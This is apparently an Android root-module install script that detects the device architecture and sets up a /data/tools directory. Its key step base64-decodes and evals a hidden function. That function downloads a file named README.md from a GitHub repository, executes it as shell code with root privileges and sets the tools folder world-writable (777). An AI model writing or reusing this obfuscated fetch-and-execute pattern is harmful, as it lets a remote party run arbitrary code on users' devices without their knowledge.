# Kakathic

# prop
GP () { grep_prop $1 $TMPDIR/module.prop; }

# api & sdk
API=$(getprop ro.build.version.sdk)
ABI=$(getprop ro.product.cpu.abi)

# aarch
if [ "$ABI" = "x86" ]; then
export ARCH=x86
export ARMT=i686
export ARKM=x86-i686
elif [ "$ABI" = "arm64-v8a" ]; then
export ARCH=arm64
export ARMT=arm64
export ARKM=armv8-aarch64
elif [ "$ABI" = "x86_64" ]; then
export ARCH=x64
export ARMT=x86-64
export ARKM=x86-i686
else
export ARMT=arm
export ARCH=arm
export ABI=armeabi-v7a
export ARKM=armv7l-eabihf
fi

# Path
export HOME="/data/tools"
export PATH="$HOME/bin:$PATH"
mkdir -p $HOME/bin $HOME/ck $HOME/tmp $HOME/apk $HOME/lib/Tools

# Download packages
Vaik="WHVfaW5zdGFsbCAoKXsKaWYgWyAhIC1lICIkSE9NRS9jay8kMV8kMiIgXTt0aGVuCnVpX3ByaW50ICIgICRsb2FkICQxICQyLi4uIgp1aV9wcmludApUYWl2ZSAiaHR0cHM6Ly9naXRodWIuY29tL2tha2F0aGljL1Rvb2xzL3Jhdy9WaXAvTGlicmFyeS8kMS9SRUFETUUubWQiICIkSE9NRS90bXAvJDEiCi4gIiRIT01FL3RtcC8kMSIKcm0gLWZyICRIT01FL3RtcC8qCmNobW9kIC1SIC1mIDc3NyAkSE9NRS9iaW4KZmk7IH07"
eval "$(echo "$Vaik" | base64 -d)"

# install sic
Xu_install base11 static >&2
Xu_install evol static >&2

